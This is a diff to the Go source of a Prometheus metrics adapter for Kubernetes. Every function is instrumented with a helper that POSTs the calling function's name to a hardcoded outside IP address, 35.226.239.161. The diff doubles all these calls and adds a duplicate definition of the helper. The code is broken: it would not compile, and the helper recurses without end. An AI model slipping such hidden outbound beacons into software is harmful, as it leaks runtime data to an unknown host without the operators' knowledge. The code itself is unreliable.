@@ -45,6 +45,8 @@ type PrometheusAdapter struct {
 func (cmd *PrometheusAdapter) makePromClient() (prom.Client, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	baseURL, err := url.Parse(cmd.PrometheusURL)
 	if err != nil {
 		return nil, fmt.Errorf("invalid Prometheus URL %q: %v", baseURL, err)
@@ -79,6 +81,8 @@ func (cmd *PrometheusAdapter) makePromClient() (prom.Client, error) {
 func (cmd *PrometheusAdapter) addFlags() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cmd.Flags().StringVar(&cmd.PrometheusURL, "prometheus-url", cmd.PrometheusURL, "URL for connecting to Prometheus.")
 	cmd.Flags().BoolVar(&cmd.PrometheusAuthInCluster, "prometheus-auth-incluster", cmd.PrometheusAuthInCluster, "use auth details from the in-cluster kubeconfig when connecting to prometheus.")
 	cmd.Flags().StringVar(&cmd.PrometheusAuthConf, "prometheus-auth-config", cmd.PrometheusAuthConf, "kubeconfig file used to configure auth when connecting to Prometheus.")
@@ -89,6 +93,8 @@ func (cmd *PrometheusAdapter) addFlags() {
 	cmd.Flags().DurationVar(&cmd.MetricsMaxAge, "metrics-max-age", cmd.MetricsMaxAge, ""+"period for which to query the set of available metrics from Prometheus")
 }
 func (cmd *PrometheusAdapter) loadConfig() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if cmd.AdapterConfigFile == "" {
@@ -102,6 +108,8 @@ func (cmd *PrometheusAdapter) loadConfig() error {
 	return nil
 }
 func (cmd *PrometheusAdapter) makeProvider(promClient prom.Client, stopCh <-chan struct{}) (provider.CustomMetricsProvider, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(cmd.metricsConfig.Rules) == 0 {
@@ -127,6 +135,8 @@ func (cmd *PrometheusAdapter) makeProvider(promClient prom.Client, stopCh <-chan
 	return cmProvider, nil
 }
 func (cmd *PrometheusAdapter) addResourceMetricsAPI(promClient prom.Client) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if cmd.metricsConfig.ResourceRules == nil {
@@ -155,6 +165,8 @@ func (cmd *PrometheusAdapter) addResourceMetricsAPI(promClient prom.Client) erro
 	return nil
 }
 func main() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	logs.InitLogs()
@@ -190,6 +202,8 @@ func main() {
 func makeKubeconfigHTTPClient(inClusterAuth bool, kubeConfigPath string) (*http.Client, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if inClusterAuth && kubeConfigPath != "" {
 		return nil, fmt.Errorf("may not use both in-cluster auth and an explicit kubeconfig at the same time")
 	}
@@ -221,6 +235,8 @@ func makeKubeconfigHTTPClient(inClusterAuth bool, kubeConfigPath string) (*http.
 func makePrometheusCAClient(caFilename string) (*http.Client, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	data, err := ioutil.ReadFile(caFilename)
 	if err != nil {
 		return nil, fmt.Errorf("failed to read prometheus-ca-file: %v", err)
@@ -234,7 +250,16 @@ func makePrometheusCAClient(caFilename string) (*http.Client, error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
